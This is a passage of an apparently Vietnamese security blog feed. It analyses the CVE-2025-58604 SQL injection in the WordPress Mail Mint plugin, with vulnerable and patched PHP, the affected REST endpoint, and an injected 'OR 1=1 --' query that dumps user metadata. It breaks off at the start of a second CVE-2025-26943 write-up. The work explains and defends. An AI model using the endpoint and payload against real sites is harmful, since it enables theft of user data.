      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Lỗ hổng xảy ra trên plugin &lt;strong&gt;Mail Mint&lt;/strong&gt; của WordPress trước phiên bản &lt;strong&gt;1.18.6&lt;/strong&gt;. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-58604&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-58604&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/mail-mint/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Mail Mint Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.18.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (7.6)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Mail Mint&lt;/strong&gt;:  v1.18.5(vul) và v1.18.6(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Ứng dụng đã đưa trực tiếp dữ liệu từ người dùng vào câu query SQL mà &lt;strong&gt;không sử dụng các biện pháp bảo vệ&lt;/strong&gt; khiến lỗ hổng SQL Injection xảy ra.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.&#xA;Có sự khác biệt rõ ở file &lt;strong&gt;/app/Utilities/Helper/Import.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0)&#xA;{&#xA;    // other logic&#xA;&#xA;    global $wpdb;&#xA;    $total_query = &amp;#34;SELECT COUNT(DISTINCT user_id) as total&#xA;                    FROM {$wpdb-&amp;gt;prefix}usermeta&#xA;                    WHERE meta_key IN (&amp;#39;&amp;#34; . implode(&amp;#34;&amp;#39;, &amp;#39;&amp;#34;, $keys) . &amp;#34;&amp;#39;)&amp;#34;;&#xA;&#xA;    $total = $wpdb-&amp;gt;get_var($total_query); //phpcs:ignore&#xA;&#xA;    // Final query to retrieve user IDs with limit and offset.&#xA;    $final_query = &amp;#34;SELECT user_id&#xA;                    FROM {$wpdb-&amp;gt;prefix}usermeta&#xA;                    WHERE meta_key IN (&amp;#39;&amp;#34; . implode(&amp;#34;&amp;#39;, &amp;#39;&amp;#34;, $keys) . &amp;#34;&amp;#39;)&#xA;                    GROUP BY user_id&#xA;                    LIMIT $number OFFSET $offset&amp;#34;;&#xA;&#xA;    $users = $wpdb-&amp;gt;get_results($final_query, ARRAY_A); //phpcs:ignore&#xA;&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá sử dụng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; thay vì truyền trực tiếp dữ liệu từ người dùng vào câu query.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0)&#xA;{&#xA;    // other logic&#xA;&#xA;    global $wpdb;&#xA;    // Total query (safe with prepare)&#xA;    $total_query = $wpdb-&amp;gt;prepare(&#xA;        &amp;#34;SELECT COUNT(DISTINCT user_id) as total&#xA;        FROM {$wpdb-&amp;gt;usermeta}&#xA;        WHERE meta_key IN ($placeholders)&amp;#34;,&#xA;        $keys&#xA;    );&#xA;&#xA;    $total = $wpdb-&amp;gt;get_var($total_query); //phpcs:ignore&#xA;&#xA;    // Final query with LIMIT &amp;amp; OFFSET (safe with prepare)&#xA;    $final_query = $wpdb-&amp;gt;prepare(&#xA;        &amp;#34;SELECT user_id&#xA;        FROM {$wpdb-&amp;gt;usermeta}&#xA;        WHERE meta_key IN ($placeholders)&#xA;        GROUP BY user_id&#xA;        LIMIT %d OFFSET %d&amp;#34;,&#xA;        array_merge($keys, array($number, $offset))&#xA;    );&#xA;&#xA;    $users = $wpdb-&amp;gt;get_results($final_query, ARRAY_A); //phpcs:ignore&#xA;&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/diff.png&#34;&#xA;    alt=&#34;Patch Diff&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Patch Diff&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Lỗ hổng nằm trong hàm &lt;code&gt;get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0)&lt;/code&gt; của class &lt;code&gt;Import&lt;/code&gt;. Để xác định nơi nó được gọi, ta tìm kiếm với tự khóa &lt;code&gt;get_wp_users_by_learndash_with_limit_offset&lt;/code&gt; trong thư mục chứa plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/search_import.png&#34;&#xA;    alt=&#34;Search Import&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search Import&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Kết quả cho thấy hàm này được gọi trong:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;retrieve_contacts_associated_with_learndash()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;perform_learndash_user_import()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;thuộc class &lt;code&gt;ContactImportAction&lt;/code&gt; trong file &lt;strong&gt;/app/API/Actions/Admin/Contact/ContactImportAction.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Tiếp theo, để xác định nơi &lt;code&gt;retrieve_contacts_associated_with_learndash()&lt;/code&gt; được sử dụng, ta tìm kiếm từ khóa &lt;code&gt;retrieve_contacts_associated_with_learndash&lt;/code&gt; trong thư mục plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/search_1.png&#34;&#xA;    alt=&#34;Search 1&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search 1&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Hàm này được gọi trong &lt;code&gt;map_contacts_with_learndash()&lt;/code&gt; thuộc class &lt;code&gt;ContactImportController&lt;/code&gt; trong file &lt;strong&gt;/app/API/Controllers/Admin/Contact/ContactImportController.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Tiếp tục tìm kiếm từ khóa &lt;code&gt;map_contacts_with_learndash&lt;/code&gt; để xem hàm này được đăng ký ở đâu:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/search_2.png&#34;&#xA;    alt=&#34;Search 2&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search 2&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Ta phát hiện rằng nó được dùng làm callback của REST API thông qua hàm &lt;code&gt;register_rest_route()&lt;/code&gt; trong WordPress:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class ContactImportRoute extends AdminRoute {&#xA;    public function register_routes() {&#xA;        register_rest_route(&#xA;            $this-&amp;gt;namespace, // mrm/v1&#xA;            $this-&amp;gt;rest_base . &amp;#39;/learndash/map&amp;#39;, // contacts/import/learndash/map/&#xA;            array(&#xA;                array(&#xA;                    &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::CREATABLE, // POST&#xA;                    &amp;#39;callback&amp;#39;            =&amp;gt; array( $this-&amp;gt;controller, &amp;#39;map_contacts_with_learndash&amp;#39; ),&#xA;                    &amp;#39;permission_callback&amp;#39; =&amp;gt; PermissionManager::current_user_can(&amp;#39;mint_manage_contacts&amp;#39;), // Admin&#xA;                    &amp;#39;args&amp;#39;                =&amp;gt; array(&#xA;                        &amp;#39;selectedCourses&amp;#39; =&amp;gt; array(&#xA;                            &amp;#39;description&amp;#39; &#x9;&#x9;=&amp;gt; __( &amp;#39;The selected courses from which to import contacts.&amp;#39;, &amp;#39;mrm&amp;#39; ),&#xA;                            &amp;#39;required&amp;#39;    &#x9;&#x9;=&amp;gt; true,&#xA;                            &amp;#39;type&amp;#39;              =&amp;gt; &amp;#39;array&amp;#39;,&#xA;                            &amp;#39;sanitize_callback&amp;#39; =&amp;gt; &amp;#39;rest_sanitize_array&amp;#39;,&#xA;                            )&#xA;                        ), // array &amp;#43; required&#xA;                ),&#xA;            )&#xA;        );&#xA;        // other logic&#xA;    }&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Luồng gọi hàm&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;POST /wp-json/mrm/v1/contacts/import/learndash/map&lt;/code&gt; được gửi tới REST API cùng tham số bắt buộc &lt;code&gt;selectedCourses&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;map_contacts_with_learndash(WP_REST_Request $request)&lt;/code&gt; là callback được gọi:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nhận &lt;code&gt;$request&lt;/code&gt; làm tham số đầu vào.&lt;/li&gt;&#xA;&lt;li&gt;Lấy các tham số của &lt;code&gt;$request&lt;/code&gt; chuyển thành mảng &lt;code&gt;$params&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Callback gọi &lt;code&gt;retrieve_contacts_associated_with_learndash()&lt;/code&gt; với đối số là &lt;code&gt;$params&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;retrieve_contacts_associated_with_learndash()&lt;/code&gt; gọi &lt;code&gt;get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0)&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$courses&lt;/code&gt; = &lt;code&gt;$params[&#39;selectedCourses&#39;]&lt;/code&gt;, &lt;code&gt;$number&lt;/code&gt; = &lt;code&gt;5&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$keys&lt;/code&gt; là một mảng được tạo ra bằng cách lấy tất cả giá trị &lt;code&gt;value&lt;/code&gt; trong &lt;code&gt;$courses&lt;/code&gt;, sau đó ghép chuỗi theo mẫu &lt;code&gt;course_{COURSE_ID}_access_from&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Trước khi đưa vào câu query, mảng &lt;code&gt;$keys&lt;/code&gt; được nối thành một chuỗi bằng hàm &lt;code&gt;implode()&lt;/code&gt;. Nếu &lt;code&gt;$keys&lt;/code&gt; chỉ có một phần tử, kết quả của &lt;code&gt;implode()&lt;/code&gt; chính là giá trị chuỗi của phần tử đó.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Thực thi query, trả về JSON chứa &lt;code&gt;formatted_users&lt;/code&gt; + &lt;code&gt;total_users&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Sau khi phân tích, ta thấy tham số &lt;code&gt;selectedCourses&lt;/code&gt; được xử lý qua nhiều logic trước khi truyền vào query chứa SQLi, quan trọng ta vẫn kiểm soát được giá trị của key &lt;code&gt;value&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;POST request qua BurpSuite&lt;/strong&gt;:&#xA;Ta gửi request với một key duy nhất =&amp;gt; dễ dàng kiểm soát câu query.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/request_success.png&#34;&#xA;    alt=&#34;Get all user info&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Get all user info&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Khi đó, câu query trở thành:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT user_id &#xA;FROM wp_usermeta &#xA;WHERE meta_key IN (&amp;#39;course_abc&amp;#39;) OR 1=1 -- _access_from&amp;#39;) GROUP BY user_id LIMIT 5 OFFSET 0&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;)&lt;/code&gt; thoát khỏi &lt;code&gt;IN&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1=1&lt;/code&gt; luôn đúng =&amp;gt; trả về tất cả &lt;code&gt;user_id&lt;/code&gt; trong &lt;code&gt;wp_usermeta&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Đoạn code còn lại trong &lt;code&gt;get_wp_users_by_learndash_with_limit_offset&lt;/code&gt; sẽ truy vấn meta thông tin của tất cả user trả về:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$formatted_users = array_map(&#xA;    function ($user) {&#xA;        $user-&amp;gt;usermeta = array_map(&#xA;            function ($user_data) {&#xA;                return reset($user_data);&#xA;            },&#xA;            get_user_meta($user-&amp;gt;ID)&#xA;        );&#xA;        return $user;&#xA;    },&#xA;    $contacts&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-58604&lt;/strong&gt; trong plugin WordPress &lt;strong&gt;Mail Mint&lt;/strong&gt; trước phiên bản &lt;strong&gt;1.18.6&lt;/strong&gt; xuất phát từ việc không sử dụng cơ chế chuẩn bị truy vấn &lt;code&gt;($wpdb-&amp;gt;prepare)&lt;/code&gt; mà truyền trực tiếp dữ liệu từ người dùng vào câu lệnh SQL dẫn đến lỗ hổng SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá chính thức đã thay thế việc nối chuỗi bằng cách dùng &lt;code&gt;$wpdb-&amp;gt;prepare&lt;/code&gt;, giúp đảm bảo dữ liệu đầu vào được kiểm soát và an toàn hơn.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Luôn sử dụng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; khi làm việc với database trong WordPress để tránh SQL Injection.&lt;/li&gt;&#xA;&lt;li&gt;Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/mail-mint/vulnerability/wordpress-mail-mint-plugin-1-18-5-sql-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Mail Mint Plugin &amp;lt;= 1.18.5 is vulnerable to SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-26943 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-23-cve-2025-26943/</link>
      <pubDate>Tue, 23 Sep 2025 23:28:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-23-cve-2025-26943/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-23-cve-2025-26943/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Lỗ hổng xảy ra trên plugin &lt;strong&gt;Easy Quotes&lt;/strong&gt; của WordPress trước phiên bản &lt;strong&gt;1.2.3&lt;/strong&gt;. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-26943&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-26943&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/easy-quotes/#description&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Easy Quotes Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.2.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 